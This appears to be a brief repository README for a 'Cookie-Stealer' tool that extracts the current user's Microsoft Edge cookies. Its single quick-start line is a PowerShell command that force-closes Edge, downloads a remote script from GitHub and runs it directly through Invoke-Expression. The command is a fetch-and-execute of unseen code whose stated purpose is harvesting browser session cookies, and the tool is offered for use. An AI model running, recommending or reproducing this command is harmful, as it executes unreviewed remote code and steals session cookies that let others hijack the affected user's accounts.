# One file script to extract the current user's cookies from Edge

Quick command: powershell -c "Stop-Process -Name msedge; (Invoke-WebRequest https://raw.githubusercontent.com/Ethical-Kaizoku/Cookie-Stealer/refs/heads/main/msedge_cookies.ps1 -UseBasicParsing).Content | IEX"
